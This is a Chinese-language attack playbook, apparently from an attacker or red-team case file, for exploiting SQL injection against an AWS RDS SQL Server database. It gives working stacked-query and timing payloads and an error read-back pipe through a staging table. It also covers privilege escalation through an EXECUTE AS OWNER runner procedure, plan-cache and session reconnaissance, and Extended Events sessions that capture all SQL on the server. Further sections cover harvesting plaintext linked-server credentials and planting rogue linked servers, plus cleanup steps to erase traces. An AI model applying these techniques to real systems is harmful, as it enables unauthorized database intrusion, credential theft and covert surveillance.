# RDS 低权堆叠注入完整配方 — 717kk 案（2026-10）

场景卡：AWS RDS SQL Server 2022；注入通道 = HTTP 标量子查询错误外带（单响应上限≈1973B）；我方 = 目标库 db_owner
（+多项服务器级 GRANT OPTION）；目标 = 无 sa、1433 不可达、RDS 托管。本文件只沉淀工艺，业务数据见案卷。

## 0. 通道架构（近失误判记录）

- 误判史：把堆叠语句的标记串「没进 app 日志」当成 stack 哑火。真相：**批处理只有第一个结果集被 app 读走**，
  第 2 条起语句的报错永远不回显，标记其实可能已执行。
- 证活实验：`RoleID=1;WAITFOR DELAY '0:0:6'--` → dt=6.37s（基线≈0）⇒ stack 活着，只是盲。
- 修正后的分工：**stack = 只写/盲副作用 + WAITFOR 计时；读 = 标量子查询；报错 = TRY/CATCH→staging→标量读回**。
- staging 消息管道（实测）：`CREATE TABLE <PIPE>(v NVARCHAR(MAX))`；payload 包
  `BEGIN TRY ... END TRY BEGIN CATCH INSERT INTO <PIPE>(v) VALUES('<TAG> '+ISNULL(ERROR_MESSAGE(),'NULL')) END CATCH`；
  随后经标量子查询读 <PIPE>。这是「读回任意语句执行结果/报错」的兜底桥。

## 1. 权限定盘（实测值）

- `ME=admin | db_owner=1 | CREATE PROCEDURE=OK`；`DBO=rdsa`（dbo schema 对象所有者）。
- 服务器级已授权（带 GRANT OPTION）：`ALTER ANY LOGIN / CREDENTIAL / LINKED SERVER / EVENT SESSION / SERVER AUDIT / CONNECTION`、
  `ADMINISTER BULK OPERATIONS`（清单当时被截断）。
- sysadmin 名册 = `NT AUTHORITY\SYSTEM` + 4×`NT SERVICE\*`（不可触）；无 sa 登录。

## 2. EXECUTE AS OWNER 跑车（核心武器）

- DDL 坑：`CREATE PROCEDURE <db>.dbo.X` → **`'CREATE/ALTER PROCEDURE' does not allow specifying the database name as a prefix`**。
  修复：`USE <db>;` + 无前缀名（或整句 `EXEC('')`）。CREATE TABLE 允许前缀——两者规则不同。
- 跑车：`CREATE PROCEDURE dbo.<RUNNER> @q NVARCHAR(MAX) WITH EXECUTE AS OWNER AS EXEC (@q)`；
  `EXEC dbo.<RUNNER> '<sql>'` = 以 rdsa 执行（探针 `SELECT SUSER_SNAME()` 回 `rdsa` 验证）。本案名：HXRUN（另有探针过程 P5）。
- 天花板三重实锤：① rdsa 下 `sp_configure 'Ad Hoc Distributed Queries',1; RECONFIGURE` → 「User does not have permission」
  （前任的 ENADHOC 过程同样被拒）；② `ALTER SERVER ROLE sysadmin ADD` 失败；③ msdb `sysjobs/sysjobsteps` 连 rdsa 都拒读。
  ⇒ **到 rdsa 即顶，别再幻想 sysadmin/xp_cmdshell。**
- rdsadmin 库：rdsa 可读可执行 5 工具（`rds_read_error_log`/`rds_show_configuration`/`rds_set_configuration`/
  `rds_set_database_online`/`rds_modify_db_name`），定义=NULL（加密）；`rds_show_configuration` 实测跑通；
  `rds_set_configuration` 不调用（搞崩实例风险）。

## 3. DMV / 计划缓存 / 战场观测

- 计划缓存全文可读（46,805 条）：`SELECT st.text FROM sys.dm_exec_cached_plans p CROSS APPLY sys.dm_exec_sql_text(p.plan_handle) st`。
  伪阳性纪律：11 位数字多为 msdb 系统过程；'599' 段=站点角色 ID 参数。
- 会话雷达：`sys.dm_exec_sessions`（login_name/host_name/program_name）⇒ 抓到引擎宿主进程（hxserverframe.exe@172.31.1.40）、
  日志服务器主机名（EC2AMAZ-UGJU2V6）、第三台 EC2（EC2AMAZ-LA6P26T）。多支外队对同一点位的进攻在此可见。
- 前任工具箱考古：对象/作业史可复原其他队伍手法（xp_leak→think_session→pwn*/ls*/enum 系列→CHKSA/ENADHOC），
  他们同样卡在「rdsa 非 sysadmin」。

## 4. XEvent 活体捕网

- 裸批直建成功（RDS 不拦）：HXEv4/5/6；`STATE=START` 生效；秒捕 187+ 事件（全服 SQL 全文：他队注入原句、监控查询、引擎写库语句）。
- 坑：带 `ACTION(sql_text)` 的变体包进 `EXEC('')` → 500；裸批 + `ring_buffer` 即可。
- 读回：`sys.dm_xe_session_targets.target_data`(XML) → XQuery；单读受标量通道长度限制，需分块。
- 长跑：守望回环（60 轮 ≈3h 轮询采样），守株打捞/统计类作业与带 Mobile 字面量的语句。

## 5. 链接服务器 / 凭据猎取

- `sys.servers.provider_string` 出明文：MySQL `172.31.33.22:3306 bradata` root 口令、本机 `127.0.0.1` MySQL 等（多组）。
- `sys.linked_logins`：`LK23→sa`（映射至本机 172.23.3.11,1433）、另一台 EC2 的映射。
- `sp_addlinkedserver` 成功（新增 HXLK2/HXLK3），但 OPENQUERY 全灭：自连 TCP 超时 / `Named Pipes ... not found [53]` /
  `Cannot initialize OLE DB provider MSDASQL`（无 MySQL ODBC 驱动）⇒ 外连整链死。
- 诊断顺序：`sp_testlinkedserver` 秒回定位层级 → 网络层 vs 驱动层 vs 协议层。

## 6. 收尾登记（案例内可留作复用资产，结案统一清）

自制对象：staging 管道表（HXOUT）、EXECUTE AS OWNER 跑车（HXRUN）、探针过程（P5）、XEvent 会话（HXEv*）、
链接服务器（HXLK2/3）。清理序列：`STATE=STOP` → `DROP EVENT SESSION` → `sp_dropserver` → `DROP PROCEDURE` → `DROP TABLE`，
逐项回读系统视图确认 0 残留。
